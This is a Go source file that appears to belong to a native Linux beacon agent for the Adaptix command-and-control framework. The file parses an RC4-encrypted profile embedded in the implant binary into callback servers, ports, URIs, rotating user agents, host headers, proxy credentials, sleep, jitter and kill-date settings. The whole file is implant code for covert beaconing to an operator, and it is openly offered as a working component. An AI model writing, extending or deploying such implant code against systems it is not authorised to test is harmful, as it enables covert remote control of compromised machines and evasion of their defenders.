package main

import (
	"errors"
	"fmt"
)

// HTTPProfile mirrors the C structure ProfileHTTP that the Windows beacon
// receives from the Adaptix extender. Only the HTTP transport is supported by
// the native Linux agent; SMB (named pipes), DNS and bind-TCP pivoting are
// Windows specific transports and are rejected at build time.
type HTTPProfile struct {
	UseSSL      bool
	Servers     []string
	Ports       []uint16
	Method      string
	URIs        []string
	Parameter   string
	UserAgents  []string
	Headers     string
	AnsPre      int
	AnsSize     int // AnsPre + suffix
	HostHeaders []string
	Rotation    int // 0 = sequential, 1 = random
	ProxyType   int // 0 = none, 1 = http, 2 = https
	ProxyHost   string
	ProxyPort   uint16
	ProxyUser   string
	ProxyPass   string
}

// Config is the runtime configuration decoded from the RC4 protected profile
// that the extender embedded into the binary.
type Config struct {
	AgentType    uint32
	KillDate     uint32
	WorkingTime  uint32
	Sleep        uint32
	Jitter       uint32
	ListenerType uint32
	HTTP         HTTPProfile
	EncryptKey   []byte // listener RC4 key (16 bytes)

	DownloadChunk int
	// Debug enables verbose logging to stderr (never to stdout, the agent does
	// not own the operator's terminal).
	Debug bool
}

const (
	proxyNone  = 0
	proxyHTTP  = 1
	proxyHTTPS = 2
)

func loadConfig(blob []byte) (*Config, error) {
	if len(blob) < 24 {
		return nil, errors.New("embedded profile is missing or truncated (default placeholder build?)")
	}

	r := newReader(blob)
	cryptSize := int(r.u32())
	if cryptSize <= 0 || cryptSize > len(blob)-4-16 {
		return nil, fmt.Errorf("invalid profile size %d", cryptSize)
	}
	cryptParams := blob[4 : 4+cryptSize]
	key := blob[4+cryptSize : 4+cryptSize+16]
	if len(key) != 16 {
		return nil, errors.New("invalid listener key")
	}

	params, err := rc4Crypt(cryptParams, key)
	if err != nil {
		return nil, err
	}

	p := newReader(params)
	cfg := &Config{EncryptKey: append([]byte(nil), key...), DownloadChunk: 0x19000}

	cfg.AgentType = p.u32()
	cfg.KillDate = p.u32()
	cfg.WorkingTime = p.u32()
	cfg.Sleep = p.u32()
	cfg.Jitter = p.u32()
	cfg.ListenerType = p.u32()

	cfg.HTTP.UseSSL = p.u8() != 0

	serverCount := int(p.u32())
	if serverCount <= 0 || serverCount > 64 {
		return nil, fmt.Errorf("invalid server count %d", serverCount)
	}
	for i := 0; i < serverCount; i++ {
		host := p.str()
		port := uint16(p.u32())
		if host == "" {
			return nil, errors.New("empty callback host in profile")
		}
		cfg.HTTP.Servers = append(cfg.HTTP.Servers, host)
		cfg.HTTP.Ports = append(cfg.HTTP.Ports, port)
	}

	cfg.HTTP.Method = p.str()
	if cfg.HTTP.Method == "" {
		cfg.HTTP.Method = "POST"
	}

	uriCount := int(p.u32())
	if uriCount <= 0 || uriCount > 64 {
		return nil, fmt.Errorf("invalid uri count %d", uriCount)
	}
	for i := 0; i < uriCount; i++ {
		cfg.HTTP.URIs = append(cfg.HTTP.URIs, p.str())
	}

	cfg.HTTP.Parameter = p.str()
	if cfg.HTTP.Parameter == "" {
		cfg.HTTP.Parameter = "X-Beacon"
	}

	uaCount := int(p.u32())
	if uaCount <= 0 || uaCount > 64 {
		return nil, fmt.Errorf("invalid user-agent count %d", uaCount)
	}
	for i := 0; i < uaCount; i++ {
		cfg.HTTP.UserAgents = append(cfg.HTTP.UserAgents, p.str())
	}

	cfg.HTTP.Headers = p.str()
	cfg.HTTP.AnsPre = int(p.u32())
	post := int(p.u32())
	cfg.HTTP.AnsSize = cfg.HTTP.AnsPre + post

	hhCount := int(p.u32())
	if hhCount > 64 {
		return nil, fmt.Errorf("invalid host-header count %d", hhCount)
	}
	for i := 0; i < hhCount; i++ {
		cfg.HTTP.HostHeaders = append(cfg.HTTP.HostHeaders, p.str())
	}

	cfg.HTTP.Rotation = int(p.u32())
	cfg.HTTP.ProxyType = int(p.u32())
	cfg.HTTP.ProxyHost = p.str()
	cfg.HTTP.ProxyPort = uint16(p.u32())
	cfg.HTTP.ProxyUser = p.str()
	cfg.HTTP.ProxyPass = p.str()

	if cfg.Jitter > 100 {
		cfg.Jitter = 100
	}
	return cfg, nil
}
